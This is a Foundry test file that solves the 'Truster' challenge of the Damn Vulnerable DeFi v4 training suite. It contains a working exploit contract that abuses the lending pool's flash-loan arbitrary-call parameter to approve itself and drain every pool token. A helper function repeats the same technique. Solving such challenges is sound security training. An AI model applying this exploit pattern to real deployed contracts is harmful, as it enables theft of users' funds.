// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";


contract TrustExploiter{
    constructor(address _pool, address _token, address _recovery) {
        // Cast the address to DamnValuableToken to access balanceOf function
        DamnValuableToken token = DamnValuableToken(_token);
        uint256 poolBalance = token.balanceOf(_pool);
        
        // Generate approval data to give the player permission to move tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        
        // Call the flashLoan function with zero borrowing but use the data parameter to approve
        TrusterLenderPool(_pool).flashLoan(0, address(this), _token, data);
        
        // Transfer all tokens from the pool to the recovery address
        token.transferFrom(_pool, _recovery, poolBalance);
    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
    
     */
    function _carryOutAttack(address _pool, address _token) internal {
        // Generate approval data to give the player permission to move tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
        
        // Call the flashLoan function with zero borrowing but use the data parameter to approve
        // This will be executed as player due to the checkSolvedByPlayer modifier
        TrusterLenderPool(_pool).flashLoan(0, player, _token, data);
        
        // Transfer all tokens from the pool to the recovery address
        // This is still executed as the player (from the modifier)
        DamnValuableToken(address(_token)).transferFrom(address(_pool), recovery, TOKENS_IN_POOL);
   }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Exploit the TrusterLenderPool contract
        new TrustExploiter(address(pool), address(token), recovery);

       
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
